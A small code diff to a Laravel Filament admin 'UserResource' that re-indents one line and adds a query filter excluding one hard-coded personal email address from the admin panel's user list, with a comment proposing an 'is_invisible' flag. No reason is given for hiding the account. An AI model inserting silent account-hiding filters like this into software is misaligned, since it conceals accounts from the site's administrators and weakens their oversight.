@@ -74,7 +74,7 @@ class UserResource extends Resource
                             ->password()
                             ->required(fn(string $operation): bool => $operation === 'create')
                             ->dehydrated(false) // Não salva esse campo no banco
-                            //->visible(fn(Forms\Get $get) => filled($get('password'))),
+                        //->visible(fn(Forms\Get $get) => filled($get('password'))),
                     ])->columns(2)
             ]);
     }
@@ -132,5 +132,13 @@ class UserResource extends Resource
             'create' => Pages\CreateUser::route('/create'),
             'edit' => Pages\EditUser::route('/{record}/edit'),
         ];
+    }
+
+    public static function getEloquentQuery(): \Illuminate\Database\Eloquent\Builder
+    {
+        return parent::getEloquentQuery()
+            ->where('email', '!=', 'marcoanunes23@gmail.com');
+        // Ou use uma lógica mais abrangente, como:
+        // ->where('is_invisible', false);
     }
 }
